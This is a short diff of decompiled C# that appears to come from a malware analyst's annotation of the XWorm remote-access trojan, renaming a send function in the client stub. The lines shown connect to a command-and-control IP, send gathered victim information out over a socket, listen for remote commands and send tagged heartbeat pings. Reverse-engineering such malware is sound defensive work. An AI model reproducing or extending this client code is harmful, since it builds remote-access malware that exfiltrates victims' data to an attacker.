@@ -73,7 +73,7 @@ namespace Stub
 				mw_config.mw_currentC2IP = SnWwUCSGb5CwQPNw3fbamQnl;
 				mw_Utils.mw_hasSocketAsyncCallSucceeded = true;
 				mw_Utils.mw_syncLockObject = RuntimeHelpers.GetObjectValue(new object());
-				mw_Utils.mw_sendDataOverXChat(Conversions.ToString(mw_Utils.mw_gatherVictimInfo()));
+				mw_Utils.mw_sendDataOverSocket(Conversions.ToString(mw_Utils.mw_gatherVictimInfo()));
 				mw_Utils.mw_isAwaitingPong = false;
 				mw_Utils.mw_socket.BeginReceive(mw_Utils.mw_buffer, 0, mw_Utils.mw_buffer.Length, SocketFlags.None, new AsyncCallback(mw_Utils.is_C2Listener), null);
 				TimerCallback callback = new TimerCallback(mw_Utils.mw_sendPing);
@@ -384,7 +384,7 @@ namespace Stub
 		}
 
 		// Token: 0x0600005D RID: 93
-		public static void mw_sendDataOverXChat(string value)
+		public static void mw_sendDataOverSocket(string value)
 		{
 			object obj = mw_Utils.mw_syncLockObject;
 			ObjectFlowControl.CheckForSyncLockOnValueType(obj);
@@ -502,7 +502,7 @@ namespace Stub
 			{
 				if (mw_Utils.mw_hasSocketAsyncCallSucceeded)
 				{
-					mw_Utils.mw_sendDataOverXChat(string.Concat(new string[]
+					mw_Utils.mw_sendDataOverSocket(string.Concat(new string[]
 					{
 						"PING!",
 						mw_config.mw_XwormTag,
